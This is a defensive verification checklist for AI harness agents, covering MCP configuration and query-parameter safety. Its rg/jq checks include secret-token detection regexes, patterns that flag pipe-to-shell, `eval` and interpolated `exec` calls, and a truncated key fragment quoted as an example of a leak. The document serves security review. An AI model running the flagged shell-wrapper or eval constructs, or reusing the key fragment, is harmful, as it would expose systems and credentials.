# mcpcheck.md — MCP & Parameter Verification Spec (stack-agnostic, script-free)

> **What this is.** A deterministic checklist the harness agents execute with ordinary tools (`rg`, `jq`, `git`) — no Python, no project-specific scripts.
> It works for any stack (Next.js, React, Flutter/Dart, React Native, Node, Python, Java/Kotlin, Go, Swift, C#…): the config checks are about MCP files, the parameter checks are driven by *tables* you extend per language.
> **Who runs it:** Orchestrator (G0), Builder self-check + Reviewer (G1), Security + QA (G3/G4). **Policy and rationale:** `docs/mcpguide.md`. **Config source:** `docs/mcp.md`.
> Every command below was executed against good/bad fixtures before publishing (see Appendix A). Where a check cannot be reduced to a command, it says **MANUAL** and states exactly what to look for.

---

## 0. Contract

### 0.1 Verdicts and severities
| Severity | Meaning | Gate effect |
|---|---|---|
| **BLOCKER** | Security or integrity defect (secret, injection, write-DB exposure) | Gate fails; no waiver without user approval |
| **MAJOR** | Likely defect or policy violation | Fails in `release` mode; must be fixed or suppressed (§7.3) before G4 |
| **WARN** | Smell / needs human judgement | Logged; Reviewer must acknowledge |
| **INFO** | Inventory output | Recorded as evidence only |

Each check ends in one verdict: `PASS`, `FAIL`, `WARN`, `N/A` (not applicable to this stack — say why), or `MANUAL-PASS/FAIL` (agent read the code instead of using a tool — record `method: manual`).

### 0.2 Modes
| Mode | When | Differences |
|---|---|---|
| `dev` | local work, G0/G1 | `@latest` pins = WARN |
| `ci` | every push | `@latest` pins = FAIL; scope P-checks to the diff |
| `release` | before G5/ship | all MAJOR = FAIL; full-tree scan; live smoke tests (C-18) required |

### 0.3 Tool prerequisites and portability rules (learned the hard way)
- Required: `rg` (ripgrep ≥ 13), `jq` ≥ 1.6, `git`. Install: macOS `brew install ripgrep jq`; Debian/Ubuntu `apt install ripgrep jq`; Windows `winget install BurntSushi.ripgrep.MSVC jqlang.jq` (or `scoop install ripgrep jq`); any OS `cargo install ripgrep`.
- **Always pass an explicit path to `rg` (use `.`).** Agent shells are usually non-interactive and `rg` with no path **reads stdin and hangs**. Prefix long scans with `timeout 60`.
- `rg` honours `.gitignore` and skips dot-files. For env files use `--hidden --no-ignore -g '.env*'`.
- Use **single quotes** around patterns. On Windows run these in Git Bash or WSL; native PowerShell/cmd quoting differs and is not covered here.
- If a tool is unavailable: do the check by reading the file and applying the pass condition; record `method: manual`.
- Regex flavour is Rust `regex` (no lookaround). Where a negative lookahead would be needed, the doc uses a second `rg -v` filter instead.

### 0.4 Variables used below
```bash
CFG=.mcp.json            # config under test (see C-00 for other locations)
SRC=.                    # source root (or the diff file list, see §8.2)
KW='MATCH|MERGE|UNWIND|DETACH DELETE|SELECT|INSERT INTO|UPDATE|DELETE FROM|DROP TABLE|ALTER TABLE|CREATE (TABLE|INDEX|CONSTRAINT)|WHERE|RETURN'
SECRET_RE='(m0-[A-Za-z0-9]{16,}|fc-[A-Za-z0-9]{16,}|ghp_[A-Za-z0-9]{30,}|gho_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9_-]{20,}|sk_[A-Za-z0-9]{16,}|sntrys_[A-Za-z0-9]{16,}|lin_api_[A-Za-z0-9]{20,}|xox[baprs]-[A-Za-z0-9-]{10,}|AIza[0-9A-Za-z_-]{35}|-----BEGIN [A-Z ]*PRIVATE KEY-----)'
```
`SECRET_RE` lists known vendor shapes (Mem0 `m0-`, Firecrawl `fc-`, GitHub, AWS, Slack, Google…). Unknown vendors are caught by the key-name rule (C-02b) and the assignment rule (P-09c). Add new shapes here when you adopt a new provider.

---

## 1. Preflight (always first)

**PF-1 Detect stack(s)** — record in the report.
```bash
git ls-files | rg '(^|/)(package\.json|pubspec\.yaml|pyproject\.toml|requirements\.txt|go\.mod|pom\.xml|build\.gradle(\.kts)?|Cargo\.toml|composer\.json|Gemfile|Package\.swift|Podfile|[^/]+\.csproj)$'
```
| Manifest | Stack hint | Notes |
|---|---|---|
| `package.json` with `next` | Next.js | also check `react`, `vite`, `expo`, `react-native` deps to classify |
| `package.json` with `react` and no `next` | React SPA (Vite/CRA) | public env prefixes differ (S-02) |
| `pubspec.yaml` | Flutter / Dart | compiled-in constants are extractable (S-04) |
| `pyproject.toml` / `requirements.txt` | Python | |
| `pom.xml` / `build.gradle*` | Java / Kotlin / Android | |
| `go.mod`, `Cargo.toml`, `*.csproj`, `Package.swift`, `Gemfile`, `composer.json` | Go / Rust / C# / Swift / Ruby / PHP | |

**PF-2 Locate MCP configs (C-00).**
```bash
git ls-files --cached --others --exclude-standard | rg '(^|/)(\.mcp\.json|mcp\.json|mcp_config\.json|cline_mcp_settings\.json)$'
```
| Client | File | Root key |
|---|---|---|
| Claude Code (project) | `.mcp.json` | `mcpServers` |
| Cursor | `.cursor/mcp.json` | `mcpServers` |
| Windsurf / Cline / Antigravity | `.windsurf/mcp.json`, `cline_mcp_settings.json`, `.agents/mcp_config.json` (paths as reported by the user; confirm per client) | `mcpServers` |
| VS Code | `.vscode/mcp.json` | **`servers`** |
| Codex | `~/.codex/config.toml` (user-level, not in repo) | TOML tables `[mcp_servers.<name>]` |

All `jq` commands below use `(.mcpServers // .servers)` so they work for both JSON shapes. **For TOML (Codex)** use the `rg` variants marked *(TOML)*.

**PF-3 Collect harness artefacts** needed for cross-checks: `harness/tools/registry.yaml`, `docs/mcp.md` (preset), `docs/harness.md` §10–§11.

---

## 2. Part A — MCP configuration checks

### A.1 Summary
| ID | Check | Sev | Mode |
|---|---|---|---|
| C-01 | Config parses and defines ≥ 1 server | BLOCKER | all |
| C-02 | No literal secrets (token shapes, secret-named keys, assignments) | BLOCKER | all |
| C-03 | No credentials embedded in URLs | BLOCKER | all |
| C-04 | Remote endpoints use HTTPS (loopback exempt) | MAJOR | all |
| C-05 | Packages/images pinned to exact versions | WARN (dev) / MAJOR (ci, release) | see mode |
| C-06 | Canonical, unique server names | MAJOR | all |
| C-07 | No duplicate registration of the same target | MAJOR | all |
| C-08 | Database servers: read-only twin exists; `*-readonly` really is read-only | BLOCKER | all |
| C-09 | Write-capable servers are `approval: confirm`, role-limited, dev-only | BLOCKER | all |
| C-10 | Registry parity with config | MAJOR | all |
| C-11 | At most one canonical memory server; cloud memory is `no-pii` | MAJOR | all |
| C-12 | Untrusted-output servers flagged and role-restricted | MAJOR | all |
| C-13 | Telemetry opt-outs set where available | WARN | all |
| C-14 | Browser servers isolated (no personal profile; headless in CI) | MAJOR | all |
| C-15 | No shell wrappers / pipe-to-shell in server commands | BLOCKER | all |
| C-16 | Platform wrappers (`cmd /c`) only where needed | WARN | all |
| C-17 | Localhost servers marked conditional (`requires`) | WARN | all |
| C-18 | Live smoke test: every enabled server connects and lists tools | MAJOR (BLOCKER in release) | release |
| C-19 | Tool-surface budget per role | WARN | all |
| C-20 | Secret-file hygiene (`.env*` ignored/untracked, example present) | BLOCKER | all |
| C-21 | Secret history scan | BLOCKER | release |

### A.2 Commands and pass conditions

**C-01 — parses, has servers** (BLOCKER). Pass = exit code 0.
```bash
jq -e '(.mcpServers // .servers) | type == "object" and length > 0' "$CFG" >/dev/null && echo PASS || echo FAIL
```
*(TOML)* `rg -n '^\[mcp_servers\.[A-Za-z0-9_-]+\]' ~/.codex/config.toml` → ≥ 1 line.

**C-02 — no literal secrets** (BLOCKER). Pass = all three commands print nothing.
```bash
# (a) known vendor token shapes anywhere in the file
jq -r '[.. | strings] | .[]' "$CFG" | rg -n -e "$SECRET_RE"

# (b) any env/header whose KEY NAME looks secret but whose value is not an env reference
jq -r '(.mcpServers // .servers) | to_entries[] | .key as $n
  | ((.value.env // {}) + (.value.headers // {})) | to_entries[]
  | select(.key | test("key|token|secret|password|authorization"; "i"))
  | select(.value | tostring | test("^\\s*((Bearer|Token)\\s+)?(\\$\\{[^}]+\\}|\\$[A-Z_][A-Z0-9_]*|\\{env:[^}]+\\})?\\s*$") | not)
  | [$n, .key] | @tsv' "$CFG"
```
Accepted references: `${VAR}`, `$VAR`, `{env:VAR}`, empty string, and Codex `bearer_token_env_var = "VAR"`. A **partial/truncated real key** (as seen in v1: `sk_mhp6zj2k…`) is still a leak of key material — treat as FAIL and rotate.
*(TOML)* `rg -n -e "$SECRET_RE" ~/.codex/config.toml` and `rg -n -i '(key|token|secret|password)\s*=\s*"[^"$]{8,}"' ~/.codex/config.toml`.

**C-03 — credentials in URLs** (BLOCKER). Pass = prints nothing.
```bash
jq -r '(.mcpServers // .servers) | to_entries[] | select(.value.url) | [.key, .value.url] | @tsv' "$CFG" \
 | rg -n -i '(/(fc|m0|sk|ghp)[-_][A-Za-z0-9]{8,}(/|$)|[?&](api[_-]?key|apikey|token|access_token|key|secret)=)'
```
Fix: use the vendor's OAuth endpoint or an `Authorization` header with an env reference. (Firecrawl's `…/<API_KEY>/v2/mcp` form fails this check; use `…/v2/mcp-oauth`.)

**C-04 — HTTPS for remote** (MAJOR). Pass = prints nothing. Loopback (`localhost`, `127.0.0.1`, `[::1]`) is exempt.
```bash
jq -r '(.mcpServers // .servers) | to_entries[] | select(.value.url) | [.key, .value.url] | @tsv' "$CFG" \
 | rg -n -v '\thttps://|\thttp://(localhost|127\.0\.0\.1|\[::1\])(:|/|$)'
```

**C-05 — exact version pins** (WARN dev, MAJOR ci/release). Lists every launcher package that is *not* pinned; pass = prints nothing.
```bash
jq -r '(.mcpServers // .servers) | to_entries[]
  | select((.value.command // "") | IN("npx","bunx","uvx","pnpm","yarn","deno"))
  | [.key, (.value.args // [] | map(select(startswith("-") | not)) | map(select(IN("dlx","exec","run") | not)) | .[0] // "")] | @tsv' "$CFG" \
 | rg -n -v '(@|==)[0-9]+\.[0-9]+\.[0-9]+([-+][0-9A-Za-z.-]+)?$'
```
Rules: `@latest`, no version, or a range = unpinned. Scoped packages (`@scope/name`) with no trailing `@x.y.z` = unpinned. Python launchers pin with `pkg==x.y.z` or `pkg@x.y.z`. **Docker** (`"command":"docker"`): MANUAL — the image must carry an exact tag or `@sha256:` digest, never `:latest` or no tag:
```bash
jq -r '(.mcpServers // .servers) | to_entries[] | select(.value.command == "docker") | [.key, (.value.args | join(" "))] | @tsv' "$CFG"
```
*Version age (≥ 14 days):* for npm `npm view <pkg> time --json`, for PyPI open `https://pypi.org/pypi/<pkg>/json` (`releases.<ver>[0].upload_time`). Record chosen version + date in `docs/memory/assumptions.md`. (`shadcn@latest mcp` is pinned as `shadcn@x.y.z mcp`.)

**C-06 — canonical unique names** (MAJOR). Names must be kebab-case, match `docs/mcp.md` §1 and registry keys, and be unique ignoring case.
```bash
jq -r '(.mcpServers // .servers) | keys[]' "$CFG" | rg -v '^[a-z0-9]+(-[a-z0-9]+)*$'          # non-kebab → violations
jq -r '(.mcpServers // .servers) | keys[] | ascii_downcase' "$CFG" | sort | uniq -d             # case-insensitive duplicates
```

**C-07 — duplicate targets** (MAJOR). Same package or URL under two names (or a plugin plus a manual entry — Mem0 documents this collision for Codex).
```bash
jq -r '(.mcpServers // .servers) | to_entries[] | [(.value.url // ((.value.args // []) | map(select(startswith("-") | not)) | .[0]) // .value.command), .key] | @tsv' "$CFG" | sort | awk -F'\t' '{c[$1]++; n[$1]=n[$1]" "$2} END{for(k in c) if(c[k]>1) print k":"n[k]}'
```
Intentional twins that differ only by env (e.g., `falkordb` + `falkordb-readonly`) will be listed — that is expected; **the Reviewer confirms the env differs** (see C-08).

**C-08 — database servers: read-only twin** (BLOCKER).
```bash
# (a) any server named *readonly must actually force read-only (FalkorDB: FALKORDB_DEFAULT_READONLY=true)
jq -r '(.mcpServers // .servers) | to_entries[] | select(.key | test("read-?only$"; "i"))
  | select((.value.env.FALKORDB_DEFAULT_READONLY // "") != "true") | .key' "$CFG"            # must print nothing

# (b) number of FalkorDB servers that are read-only (must be ≥ 1 when any FalkorDB server exists)
jq -r '[(.mcpServers // .servers) | to_entries[] | select(.value | tostring | test("falkordb"; "i"))
  | select((.value.env.FALKORDB_DEFAULT_READONLY // "") == "true")] | length' "$CFG"

# (c) inventory of every database-ish server for manual review
jq -r '(.mcpServers // .servers) | to_entries[] | select(.value | tostring | test("falkordb|postgres|mysql|mongo|redis|sqlite|neo4j|supabase|clickhouse"; "i")) | .key' "$CFG"
```
Pass: (a) empty; (b) ≥ 1 if (c) lists FalkorDB. **Other databases** have their own read-only mechanisms (read-only DB role/user, `--read-only`/`readOnly` server flags): **MANUAL** — confirm per vendor docs that each DB server in (c) has a read-only variant or connects with a read-only credential, and record how.

**C-09 — write-capable servers** (BLOCKER, mostly MANUAL cross-check with registry).
Pass conditions: every server with write capability (FalkorDB with `FALKORDB_DEFAULT_READONLY` ≠ `true`, DB servers with write credentials, `linear`/`github` with write scopes, `sengra-mcp` write tools) has in `harness/tools/registry.yaml`: `approval: confirm`, a non-empty `allowed_roles` containing only lane roles (never `all`), and a `constraint` naming the dev target. Its host must not look like production:
```bash
jq -r '(.mcpServers // .servers) | to_entries[] | select((.value.env.FALKORDB_DEFAULT_READONLY // "") != "true") | select(.value | tostring | test("falkordb"; "i")) | [.key, (.value.env.FALKORDB_HOST // "-")] | @tsv' "$CFG" | rg -n -i 'prod|live|primary'    # must print nothing
```

**C-10 — registry parity** (MAJOR).
```bash
jq -r '(.mcpServers // .servers) | keys[]' "$CFG" | sort > /tmp/cfg_servers.txt
rg -o --no-line-number 'name:\s*(mcp__)?([A-Za-z0-9-]+)' -r '$2' harness/tools/registry.yaml | sort -u > /tmp/reg_servers.txt
comm -23 /tmp/cfg_servers.txt /tmp/reg_servers.txt     # in config, not in registry → violation
```
Also MANUAL: every registry entry has `kind`, `allowed_roles`, `approval ∈ {auto, confirm, forbidden}`; no role lists a `forbidden` tool; every `allowed_roles` role exists under `harness/roles/`.

**C-11 — memory** (MAJOR). At most one memory MCP (`mem0`, `memory`, …); repo files (`docs/memory/`) remain canonical (`prompt.md` §10).
```bash
jq -r '(.mcpServers // .servers) | keys[] | select(test("^(mem0|mem0-mcp|memory)$"))' "$CFG"      # > 1 line → FAIL
```
If `mem0` (cloud) is present: registry must carry `data_class: no-pii`, and `docs/harness.md` §11 must state what may be stored. MANUAL.

**C-12 — untrusted-output servers** (MAJOR). Servers that return third-party content (`firecrawl`, fetch/browser servers, `sentry` text, issue trackers) must have `untrusted_output: true` in the registry and be restricted to the roles in `docs/mcpguide.md` §7.
```bash
rg -n -B1 -A6 'firecrawl|fetch|browser|playwright' harness/tools/registry.yaml
```
Pass = each hit's entry shows `untrusted_output: true` (or an `allowed_roles` list that excludes roles able to call write tools).

**C-13 — telemetry** (WARN). `chrome-devtools-mcp` should run with `--no-usage-statistics`; review other servers' docs for analytics flags.
```bash
jq -r '(.mcpServers // .servers) | to_entries[] | select(.value | tostring | test("chrome-devtools")) | select((.value.args // []) | index("--no-usage-statistics") | not) | .key' "$CFG"
```

**C-14 — browser isolation** (MAJOR). Browser MCPs expose page contents to the agent. Pass: no `--user-data-dir`/profile path pointing at a personal profile; `--headless` present in `ci`/`release`.
```bash
jq -r '(.mcpServers // .servers) | to_entries[] | select(.value | tostring | test("playwright|chrome-devtools")) | [.key, ((.value.args // []) | join(" "))] | @tsv' "$CFG"
```
Inspect output: flag any `user-data-dir`, `--browser-url` to a daily browser, or missing `--headless` in CI.

**C-15 — no shell wrappers** (BLOCKER). Server commands must be a direct launcher (`npx`, `uvx`, `node`, `docker`, a binary), never `sh -c`, `bash -c`, `curl | sh`, or `eval`.
```bash
jq -r '(.mcpServers // .servers) | to_entries[] | select((.value.command // "") | IN("sh","bash","zsh","pwsh","powershell")) | [.key, .value.command] | @tsv' "$CFG"
jq -r '(.mcpServers // .servers) | to_entries[] | select((.value.args // []) | map(tostring) | join(" ") | test("\\|\\s*(sh|bash)\\b|\\beval\\b")) | .key' "$CFG"
```
Both must print nothing. (`cmd` is handled by C-16.)

**C-16 — platform wrappers** (WARN).
```bash
jq -r '(.mcpServers // .servers) | to_entries[] | select(.value.command == "cmd") | .key' "$CFG"
```
`cmd /c npx …` is a Windows-only workaround; it breaks macOS/Linux/CI. Keep it only in a Windows-specific config, never in the shared `.mcp.json`.

**C-17 — conditional localhost servers** (WARN). Servers pointing at loopback (e.g., `sengra-mcp` at `:3000`) only work while the dev server runs; the registry entry must carry `requires: dev-server` so "connection refused" is treated as "start it", not a harness failure.
```bash
jq -r '(.mcpServers // .servers) | to_entries[] | select((.value.url // "") | test("localhost|127\\.0\\.0\\.1")) | .key' "$CFG"
```

**C-18 — live smoke test** (release: BLOCKER). MANUAL/LIVE. For each enabled server: (1) client lists it as *connected*; (2) it exposes ≥ 1 tool; (3) one read-only tool call succeeds. Stdio servers can be probed with the official inspector: `npx -y @modelcontextprotocol/inspector <command> <args…>`. Record server, tool count, call result in the report. A configured-but-not-connected server needed by a role counts as a G0 failure for that role.

**C-19 — tool-surface budget** (WARN). Each role should load ≤ 6 servers (default; set in `harness.md`). Count per role from the registry's `allowed_roles`; more servers = more context cost and more wrong-tool calls. MANUAL.

**C-20 — secret-file hygiene** (BLOCKER).
```bash
git ls-files | rg '(^|/)\.env' | rg -v '\.(example|sample|template)$'        # tracked real env files → must print nothing
git check-ignore -q .env.mcp && echo "ignored: ok" || echo "FAIL: .env.mcp not ignored"
test -f .env.mcp.example && echo "example present" || echo "FAIL: .env.mcp.example missing"
timeout 60 rg -n --hidden --no-ignore -g '.env*' -g '!*.example' -e "$SECRET_RE" .  # real secrets on disk: confirm each file is git-ignored
```
`.env.mcp.example` must contain variable names only, no values.

**C-21 — history scan** (release; BLOCKER). Finds secrets already committed:
```bash
git log --all --oneline -E -G '(m0-[A-Za-z0-9]{16,}|fc-[A-Za-z0-9]{16,}|ghp_[A-Za-z0-9]{30,}|github_pat_[A-Za-z0-9_]{30,}|AKIA[0-9A-Z]{16}|sk-[A-Za-z0-9_-]{20,}|-----BEGIN [A-Z ]*PRIVATE KEY-----)'
```
Any commit listed = rotate the credential first, then purge history (BFG / `git filter-repo`). Rotation is mandatory; purging alone is not enough.

---

## 3. Part B — Parameter-binding & injection checks (any language, any query dialect)

### B.1 Principle
Untrusted values must reach an interpreter (Cypher, SQL, GraphQL, NoSQL filters, shell, URL builders, MCP tool arguments) **only as bound parameters or validated structured fields — never by string building.** This applies equally to app code, MCP server handlers, and the queries *agents themselves* send through database MCP tools.

### B.2 Checks
| ID | Check | Sev |
|---|---|---|
| P-01 | Inventory every query sink (coverage guarantee) | INFO → feeds P-02 |
| P-02 | No interpolation / concatenation inside query strings | BLOCKER |
| P-03 | Read paths use the read-only API/server | MAJOR |
| P-04 | Write queries live only in allow-listed modules | MAJOR |
| P-05 | Dynamic identifiers (labels, relationship types, columns, `ORDER BY`, table names) go through a constant allow-list | BLOCKER |
| P-06 | Every MCP tool handler validates input with a strict schema | MAJOR |
| P-07 | No shell/eval with interpolated input | BLOCKER |
| P-08 | URLs/HTTP requests built with URL builders, not string concatenation | MAJOR |
| P-09 | No secrets in client bundles, assets, or source literals | BLOCKER |
| P-10 | No secrets/PII written to logs | MAJOR |

### B.3 P-01 — sink inventory (do this before trusting pattern hits)
Pattern hits can miss unusual code, so first list **every place a query is executed** and read each one. For each sink, the first argument must be (i) a constant string, or (ii) a variable traceable to a constant/allow-listed map.
```bash
timeout 60 rg -n -g '!node_modules' -g '!*.min.*' -g '!build' -g '!dist' -g '!.next' -g '!.dart_tool' \
 '\b(graph\.(ro_)?query|roQuery|GRAPH\.(RO_)?QUERY|session\.run|\.executeQuery|\.executeUpdate|\.execute\(|\.query\(|\.rawQuery|rawInsert|rawUpdate|rawDelete|customSelect|customStatement|\$queryRawUnsafe|\$executeRawUnsafe|\.raw\(|sql\.raw\(|createNativeQuery|prepareStatement|db\.(Query|Exec)(Context)?\(|text\()' "$SRC"
```
Sinks to know per ecosystem (extend this table, then extend the regex above):
| Ecosystem | Safe form (bound) | Unsafe form (flag) |
|---|---|---|
| Cypher / FalkorDB (JS, Python, any client) | `MATCH (a {id: $id})` + params object/map | any string-built query; `GRAPH.QUERY` via raw Redis call with interpolation |
| SQL – Node (`pg`, `mysql2`, knex, Prisma, Drizzle) | `$1`/`?` + values array; Prisma `` $queryRaw`…${v}` `` tagged template | `$queryRawUnsafe`, `$executeRawUnsafe`, `knex.raw(\`…${v}\`)`, `sql.raw(...)` |
| SQL – Python (psycopg, sqlite3, SQLAlchemy) | `execute("… %s", (v,))` / `execute("… ?", (v,))`; `text("… :id")` + dict | f-string / `%` operator / `.format()` / `+` building |
| Dart / Flutter (`sqflite`, `drift`, `postgres`) | `rawQuery('… ?', [v])`; Drift `Variable` bindings | `rawQuery("… $v")`, `rawQuery('… ${v}')`, `customSelect` with interpolated SQL |
| Java / Kotlin | `PreparedStatement` with `?`; JPA/Hibernate named params | `Statement` + `+`/`String.format`, `createNativeQuery` with concatenation |
| Go | `db.Query("… $1", v)` / `?` | `fmt.Sprintf` into the query string |
| Swift (GRDB/SQLite) | `?` + `arguments:` | `"… \(v)"` interpolation |
| C# | `SqlParameter` / EF `FromSqlInterpolated` | `FromSqlRaw` with `$"…{v}"` or `+` |

### B.4 P-02 — interpolation inside query strings (BLOCKER)
Uppercase keywords keep false positives low. **Queries written in lowercase are missed by these patterns** — that is why P-01 exists; also re-run any pattern with `-i` on files that contain sinks.
Pass = no output after pragma filtering (B.8).

```bash
# JS/TS: template literal containing a query keyword AND ${...}  (multi-line aware)
timeout 60 rg -n -U -g '*.{ts,tsx,js,jsx,mjs,cjs}' '`[^`]*\b('"$KW"')\b[^`]*\$\{[^`]*`' "$SRC"

# Any C-family / JS / Dart / Go language: keyword literal + operand, or operand + keyword literal
timeout 60 rg -n -g '*.{ts,tsx,js,jsx,mjs,cjs,java,kt,cs,scala,dart,go}' \
  '\b('"$KW"')\b[^\n]*["'"'"'`]\s*\+\s*[\w$(]|[\w$)\]]\s*\+\s*["'"'"'`][^\n]*\b('"$KW"')\b' "$SRC"

# Python: f-string with {expr}, "..." % x, "...".format(...)   (psycopg-style "%s" + args tuple is NOT flagged)
timeout 60 rg -n -g '*.py' '\b[fF][rR]?["'"'"'][^"'"'"'\n]*\b('"$KW"')\b[^"'"'"'\n]*\{[^{}][^}]*\}|["'"'"'][^"'"'"'\n]*\b('"$KW"')\b[^"'"'"'\n]*["'"'"']\s*(\.format\(|%\s*[(\w])' "$SRC"

# Dart: "$var" / "${expr}" inside a non-raw string containing a keyword (raw r'…' strings filtered out)
timeout 60 rg -n -g '*.dart' '\b('"$KW"')\b[^\n]*\$(\{|[A-Za-z_])' "$SRC" | rg -v "[^A-Za-z]r['\"]" -

# Java/Kotlin/C#/Scala: String.format with a query keyword
timeout 60 rg -n -g '*.{java,kt,cs,scala}' 'String\.format\(["'"'"'][^"'"'"'\n]*\b('"$KW"')\b' "$SRC"

# Go: fmt.Sprintf building a query
timeout 60 rg -n -g '*.go' 'fmt\.Sprintf\(["`][^"`\n]*\b('"$KW"')\b' "$SRC"

# Swift: "\(value)" interpolation inside a query literal
timeout 60 rg -n -g '*.swift' '"[^"\n]*\b('"$KW"')\b[^"\n]*\\\(' "$SRC"
```
**Dart specifics:** in Dart, `$name` inside a normal string is *interpolation*, so Cypher parameters (`$id`) must be written in a raw string (`r'… $id …'`) or escaped (`\$id`); a non-raw string with an unescaped `$` and a query keyword is always a finding. **Python specifics:** `{{`/`}}` in f-strings are escaped literal braces (common in Cypher maps) and may produce a false positive — triage by reading the line.

### B.5 P-03 / P-04 — read vs write separation (MAJOR)
- **P-03** — every function that only reads must use the read-only entry point (`ro_query`/`roQuery`/`GRAPH.RO_QUERY`, read-only DB role, `falkordb-readonly` MCP). MANUAL + help:
  ```bash
  timeout 60 rg -n -g '*.{ts,tsx,js,py,dart,java,kt,go}' '\b(MERGE|CREATE|DELETE|DETACH DELETE|SET|INSERT INTO|UPDATE|DROP|ALTER)\b' "$SRC"   # list write statements; each must sit in an allow-listed module (P-04)
  ```
- **P-04** — `docs/harness.md` §7/§11 lists the modules allowed to write (e.g., the compliance-decision writer). Any write statement outside them = FAIL. Compare the list above to that allow-list.

### B.6 P-05 — dynamic identifiers (BLOCKER)
Labels, relationship types, property names, column names, `ORDER BY` targets, table names **cannot be bound as parameters** in Cypher/SQL. They must come from a **constant allow-list/enum lookup** (`LABELS[kind]`, `switch`/`when` over a closed set). Anything derived from request data without that mapping is a FAIL. From P-02 hits, keep those where the interpolated expression is an allow-list lookup and mark them with a pragma (B.8); fail the rest.

### B.7 P-06 … P-10 — handlers, exec, URLs, secrets, logs

**P-06 — MCP tool handlers validate input (MAJOR).** Find every handler, then confirm it has an input schema and rejects unknown fields (`additionalProperties: false`, zod `.strict()`, pydantic `extra="forbid"`, typed DTOs with explicit validation in Dart/Kotlin/Java).
```bash
timeout 60 rg -n 'registerTool|\.tool\(|CallToolRequestSchema|"tools/call"|'"'"'tools/call'"'"'' "$SRC" -g '!node_modules'
```
For each hit (e.g., each of `sengra-mcp`'s 15 tools): MANUAL — schema present? error path returns a structured JSON-RPC error? `query_graph` rejects non-parameterized input and any write keyword? `record_compliance_decision` requires the officer signature field?

**P-07 — exec/eval with interpolation (BLOCKER).**
```bash
timeout 60 rg -n -g '*.{ts,tsx,js,jsx,mjs,cjs}' '\b(exec|execSync)\(\s*(`[^`]*\$\{|["'"'"'][^"'"'"']*["'"'"']\s*\+)|\beval\(|new Function\(' "$SRC"
timeout 60 rg -n -g '*.{py,dart,java,kt,go}' 'os\.system\(|shell\s*=\s*True|runInShell:\s*true|Runtime\.getRuntime\(\)\.exec|exec\.Command\("(sh|bash)",\s*"-c"' "$SRC"
```
Pass = no hits, or each hit takes only constants / allow-listed values and carries a pragma.

**P-08 — URL building (MAJOR).** Build URLs with the platform builder, not string concatenation of user input.
```bash
timeout 60 rg -n -g '*.dart' 'Uri\.parse\(["'"'"'][^"'"'"']*\$' "$SRC"                                   # use Uri(queryParameters: …) / Uri.https(host, path, query)
timeout 60 rg -n -g '*.{ts,tsx,js,jsx}' 'fetch\(\s*`[^`]*\$\{[^}]*(req|params|query|body|input)' "$SRC"   # user-derived value inside a URL template: use new URL() + searchParams
```
Server-side fetches of user-supplied URLs additionally need an allow-list (SSRF) — MANUAL.

**P-09 — secrets in client code (BLOCKER).**
```bash
# (a) literal credentials in source
timeout 60 rg -n -g '!node_modules' -g '!*.lock' -e "$SECRET_RE" "$SRC"
# (b) secret-looking names exposed through public-env prefixes (see S-01..S-05 for which prefixes ship to clients)
timeout 60 rg -n --hidden --no-ignore -g '.env*' -g '*.{ts,tsx,js,jsx,dart,json,yaml}' '\b(NEXT_PUBLIC|VITE|REACT_APP|EXPO_PUBLIC|NUXT_PUBLIC|GATSBY)_[A-Z0-9_]*(KEY|SECRET|TOKEN|PASSWORD|PRIVATE)' .
# (c) literal assignment of a long value to a secret-named variable (typed or untyped; JS/TS/Dart/Java/Kotlin/Go/Python)
timeout 60 rg -n -i -g '!node_modules' '(api[_-]?key|secret|token|passwd|password)\w*\s*(:\s*\w+\s*)?[:=]\s*["'"'"'][A-Za-z0-9+/=_.-]{16,}["'"'"']' "$SRC"
```
(b) is **WARN-by-default**: some public prefixes are *meant* to carry public identifiers (Stripe publishable key, Mapbox `pk.` token, Sentry DSN). Each hit must be listed as "public by design" in `docs/harness.md` or fail.

**P-10 — secrets/PII in logs (MAJOR).**
```bash
timeout 60 rg -n -i -g '!node_modules' '(console\.(log|debug|info|warn)|debugPrint|\bprint|logger\.\w+|\blog\.\w+)\([^)\n]*(password|passwd|secret|token|api[_-]?key|authorization)' "$SRC"
```
Also MANUAL for the SENGRA domain: logs must not contain account numbers tied to individuals, SAR narrative text, or full graph query results (data class *restricted*, `docs/mcpguide.md` §8.3).

### B.8 Suppressions (pragmas)
A reviewed line may carry a **pragma comment** on the line **where the literal/statement starts**:
`// param-ok: <reason>` · `# param-ok: <reason>` · `-- param-ok: <reason>`
Reason is mandatory and must name the allow-list or constant (e.g., `LABELS is a const allow-list`). Filter single-line hits:
```bash
… | rg -v 'param-ok:\s*\S'
```
For multi-line literals `rg` prints every line of the match; drop the whole hit if its **first line** has a valid pragma. Every pragma is re-read by the Reviewer; unexplained pragmas = FAIL. Project-wide waivers go in the ledger (§7.3).

---

## 4. Part C — Stack-specific exposure checks

| ID | Stack | Check | Sev | Command / procedure |
|---|---|---|---|---|
| S-01 | Next.js | Only `NEXT_PUBLIC_*` variables are inlined into the browser bundle; none may hold a secret. Server-only secrets must be read in route handlers/server components only | BLOCKER | P-09(b) restricted to `NEXT_PUBLIC_`; plus `rg -n 'process\.env\.[A-Z_]*(SECRET\|KEY\|TOKEN)' -g '*.tsx' --glob '**/components/**'` to find secrets read in client components (files with `"use client"`) |
| S-02 | React SPA | `VITE_*` (Vite), `REACT_APP_*` (CRA), `GATSBY_*`, `EXPO_PUBLIC_*` (Expo) are all public | BLOCKER | P-09(b) |
| S-03 | Next.js API / `/api/mcp` | HTTP MCP endpoint: validates `Origin` header (DNS-rebinding defence), binds loopback in dev, requires auth outside dev, no `Access-Control-Allow-Origin: *` | BLOCKER | `rg -n -i 'origin' -g '**/api/mcp/**' .` must show an allow-list check; `rg -n -i 'access-control-allow-origin.*\*' .` must be empty; MANUAL: confirm auth on non-dev builds |
| S-04 | Flutter / Dart | Anything compiled in is extractable: `--dart-define` values and `String.fromEnvironment` constants ship inside the binary; `flutter_dotenv` `.env` listed under `pubspec.yaml` assets ships inside the app | BLOCKER if secret | `rg -n -g '*.dart' 'fromEnvironment\(\s*["'"'"'][A-Z0-9_]*(KEY\|SECRET\|TOKEN\|PASSWORD)' .` ; `rg -n '^\s*-\s*\.env' pubspec.yaml` ; secrets belong behind your backend, not in the app |
| S-05 | React Native / Expo | `react-native-config` / `EXPO_PUBLIC_*` values are bundled | BLOCKER if secret | P-09(b) |
